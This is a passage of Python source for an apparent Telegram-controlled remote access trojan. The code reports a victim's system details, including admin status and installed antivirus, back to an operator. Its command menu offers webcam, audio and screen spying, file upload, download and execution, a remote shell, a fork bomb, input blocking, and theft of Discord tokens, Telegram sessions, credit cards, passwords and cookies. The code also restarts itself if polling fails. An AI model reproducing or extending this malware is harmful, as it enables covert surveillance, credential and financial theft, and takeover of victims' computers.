   '\n*Manufacturer* » `' + Model + '`' +
   '\n*System Time* » `' + SystemTime() + '`' +
   '\n*Username* » `' + os.getlogin() + '`' +
   '\n'
   '\n'
   '\n_Hardware_'
   '\n'
   '\n*CPU* » `' + str(CPU) +'`' +
   '\n*GPU* » `' + str(GPU) +'`' +
   '\n*RAM* » `' + str(RAM) +'`' +
   '\n*ARM* » `' + str(ARM) +'`' +
   '\n'
   '\n'
   '\n_Protection_'
   '\n'
   '\n*Started as Admin* » `' + str(Admin())+'`'+
   '\n*Process Protected* » `' + str(ProcessBSODProtectionEnabled) + '`' +
   '\n*Installed Antivirus* » `' + Antivirus[0] + '`',
   parse_mode='Markdown')
 except:
  pass


# Command handler / help

@bot.message_handler(commands=['Help', 'help'])
def Help(command):
 bot.send_message(command.chat.id,
  'ᅠᅠᅠᅠ ⚙️ *Commands* ⚙️'
  '\n'
  '\n'
  '\n*/Info* - _System Information_'
  '\n*/Location* - _Location by BSSID_'
  '\n'
  '\n*/Screen* -  _Desktop Capture_'
  '\n*/Webcam* - _Webcam Capture_'
  '\n*/Audio* - _Sound Capture_'
  '\n*/Power* - _Computer Power_'
  '\n*/Autorun* - _Startup Management_'
  '\n'
  '\n*/Files* - _Files Manager_'
  '\n› */CD* - _Change Directory_'
  '\n› */ls* - _List of Files_'
  '\n› */Remove* - _Remove a File_'
  '\n› */Upload* - _Upload File_'
  '\n› */Download* - _Download File_'
  '\n› */Run* - _Run File_'
  '\n*/Tasklist* - _Process list_'
  '\n*/Taskkill* - _Process Kill_'
  '\n'
  '\n*/Message* - _Send Message_'
  '\n*/Speak* - _Speak Message_'
  '\n*/OpenURL* - _Open URL_'
  '\n*/Wallpapers* - _Set Wallpapers_'
  '\n*/ForkBomb* - _Launch Programs_'
  '\n'
  '\n*/Discord* - _Discord Token_'
  '\n*/Telegram* - _Telegram Session_'
  '\n*/CreditCards* - _Get CreditCards_'
  '\n*/Bookmarks* - _Get Bookmarks_'
  '\n*/Passwords* - _Get Passwords_'
  '\n*/Cookies* - _Get Cookies_'
  '\n*/History* - _Get History_'
  '\n'
  '\n*/Clipboard* - _Clipboard Editing_'
  '\n*/Monitor* - _Monitor Control_'
  '\n*/Rotate* - _Display Rotate_'
  '\n*/Freeze* - _Block Input_'
  '\n*/CMD* - _Remote Shell_'
  '\n'
  '\n'
  '\n*Coded by Bainky | @bainki 👾*', 
  reply_markup=menu, parse_mode='Markdown')


# Navigation buttons

@bot.message_handler(commands=['3', '6'])
def Main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=menu, parse_mode='Markdown')

@bot.message_handler(commands=['2', '5'])
def Main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode='Markdown')

@bot.message_handler(commands=['4', '1'])
def Main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main8, parse_mode='Markdown')

@bot.message_handler(commands=['Power', 'power'])
def Power(command):
 bot.send_message(command.chat.id, '_Select an action_', reply_markup=main2, parse_mode='Markdown')

@bot.message_handler(commands=['Autorun', 'autorun'])
def Autorun(command):
 bot.send_message(command.chat.id, '_Select an action_', reply_markup=main3, parse_mode='Markdown')

@bot.message_handler(commands=['Files', 'files'])
def Files(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main7, parse_mode='Markdown')

@bot.message_handler(commands=['Cancel'])
def CancelFiles(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode='Markdown')

@bot.message_handler(commands=['Wallpapers', 'wallpapers'])
def Wallpapers(command):
 bot.send_message(command.chat.id, '_Send the photo you would like to set on the wallpapers_', parse_mode='Markdown')


try:
 
 #bot.polling(Argument)
 bot.polling(none_stop=False, interval=0, timeout=20)
except:
 os.startfile(CurrentPath)
 sys.exit()
